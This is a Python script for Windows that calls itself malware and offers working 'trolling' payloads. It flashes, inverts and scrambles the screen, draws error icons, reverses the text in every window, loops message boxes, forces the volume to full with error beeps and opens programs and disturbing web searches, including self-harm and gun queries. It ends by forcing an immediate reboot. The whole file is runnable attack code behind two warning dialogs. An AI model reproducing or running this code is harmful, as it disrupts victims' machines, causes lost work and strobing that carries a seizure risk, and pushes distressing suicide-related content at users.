from win32api import *
from win32gui import *
from win32ui import *
from ctypes import windll
from ctypes import cast, POINTER
import ctypes
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from win32con import *
from win32file import *
from random import randrange as rd
from random import *
from sys import exit
import time
import multiprocessing
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
def Warning():
    if MessageBox("BIG EPILEPSY WARNING!!\nThe software you just executed is considered as malware,\nand may damage your system .\nAre you wanting to execute this program,\nthat may result in an unusable machine?\nThe creator of this malware is NOT responsible for any damage done to any system.",
                ":D",
                MB_YESNO | MB_ICONWARNING | MB_TOPMOST) == 7:
        exit()
    if MessageBox("Are you very very sure you want to execute this?\nThe creator still is NOT responsible\nfor any damage done to the system.\n\nTHIS IS YOUR LAST WARNING!",
                 ":D",
                MB_YESNO | MB_ICONSTOP | MB_TOPMOST) == 7:
        exit()
def Message():
    while True:
        MessageBox("Still using this pc?", "XD",MB_ICONERROR | MB_TOPMOST)
class Data:
    sites = (
        "https://www.google.com/search?q=how+to+delete+a+virus",
        "https://www.google.com/search?q=how+2+kill+myself",
        "https://www.google.com/search?q=how+to+start+a+fire",
        "https://www.google.com/search?q=LOL",
        "https://media.tenor.com/2vccARVmeP0AAAAC/take-the-l-bozo.gif",
        "https://www.google.com/search?q=how+to+fix+my+pc",
        "https://www.google.com/search?q=how+to+get+a+gun",
        "https://www.roblox.com/",
        "calc",
        "notepad",
        "explorer",
        "cmd",
        "mspaint",
        "mmc"
    )

    IconWarning = LoadIcon(None, 32515)
    IconError = LoadIcon(None, 32513)

time = 0
timeSubstract = 10000


class Payloads:
    def open_sites(self):
        global timeSubstract, time
        while True:
            __import__("os").system("start " + str(choice(Data.sites)))
            Sleep(timeSubstract-time)
    def decrease_timer(self):
        print("Tiemrs")
        global time
        while time < 15000:
            time+=1
            Sleep(10)
    def blink_screen(self):
        global time, timeSubstract
        HDC = GetDC(0)
        sw, sh = (GetSystemMetrics(0), GetSystemMetrics(1))
        delay = 5
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        while True:
            Sleep(10)
            PatBlt(HDC, 0, 0, sw, sh, PATINVERT)
            StretchBlt(HDC, 10, 10, sw - 20, sh - 20, HDC, 0, 0, sw, sh, SRCCOPY)
            volume.SetMasterVolumeLevel(0.0, None)
            if delay == 0:
                delay = 5
                MessageBeep(MB_ICONWARNING)
                MessageBeep(MB_ICONERROR)
            delay -= 1

    def errorSounds(sound):
        delay = 7
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        while True:
            Sleep(10)
            volume.SetMasterVolumeLevel(0.0, None)
            if delay == 0:
                delay = 7
                MessageBeep(MB_ICONERROR)
            delay -= 1

    def reverse_text(self):
        global time, timeSubstract
        while True:
            Sleep(100)
            HWND = GetDesktopWindow()
            EnumChildWindows(HWND, Payloads.enumChildProc, None)

    def enumChildProc(hwnd, LParam):
        try:
            buffering = PyMakeBuffer(255)
            length = SendMessage(hwnd, WM_GETTEXT, 255, buffering)
            result = str(buffering[0:length*2].tobytes().decode('utf-16'))
            result = result[::-1]

            SendMessage(hwnd, WM_SETTEXT, None, result)
        except: pass

    def errorDrawingScreen(self):
        global time, timeSubstract
        HDC = GetDC(0)
        sw, sh = (GetSystemMetrics(0), GetSystemMetrics(1))
        while True:
            Sleep(0)
            DrawIcon(HDC, rd(sw), rd(sh), Data.IconError)

    def errorDrawingMouse(self):
        global time, timeSubstract
        HDC = GetDC(0)
        while True:
            Sleep(10)
            mouseX, mouseY = GetCursorPos()
            DrawIcon(HDC, mouseX, mouseY, Data.IconWarning)

    def screenPuzzle(self):
        global time, timeSubstract
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1))
        while True:
            x1 = rd(sw)
            y1 = rd(sh)
            x2 = rd(sw)
            y2 = rd(sh)
            width = rd(600)
            height = rd(600)
            BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCINVERT)
            Sleep(50)
    def rainbowNoise(self):
        print("Started")
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1))
        width = sw
        height = sh
        while True:
            BitBlt(HDC, 1, 1, width, height, HDC, 0, 0, SRCINVERT)
            Sleep(1)

if __name__ == '__main__':
    Warning()
    p = Payloads()
    opensites = multiprocessing.Process(target=p.open_sites)
    timersub = multiprocessing.Process(target = p.decrease_timer)
    reversetext = multiprocessing.Process(target=p.reverse_text)
    blinking_screen = multiprocessing.Process(target= p.blink_screen)
    errorsounds = multiprocessing.Process(target = p.errorSounds)
    messagebox = multiprocessing.Process(target= Message)
    errorDrawingScreen = multiprocessing.Process(target=p.errorDrawingScreen)
    errorDrawingMouse = multiprocessing.Process(target=p.errorDrawingMouse)
    screenpuzzle = multiprocessing.Process(target=p.screenPuzzle)
    rainbowNoise = multiprocessing.Process(target=p.rainbowNoise)

    timersub.start()
    opensites.start()
    reversetext.start()
    errorsounds.start()
    errorDrawingMouse.start()

    Sleep(5000)

    messagebox.start()

    Sleep(10000)

    screenpuzzle.start()

    Sleep(10000)

    errorsounds.terminate()
    errorDrawingMouse.terminate()
    blinking_screen.start()

    Sleep(5000)

    errorDrawingScreen.start()

    Sleep(10000)

    blinking_screen.terminate()
    errorDrawingScreen.terminate()
    errorDrawingMouse.terminate()
    opensites.terminate()
    reversetext.terminate()
    screenpuzzle.terminate()
    #rainbowNoise.start()

    Sleep(10000)

    #rainbowNoise.terminate()
    messagebox.terminate()
    timersub.terminate()
    __import__("os").system("shutdown -r -t 0")

    exit()
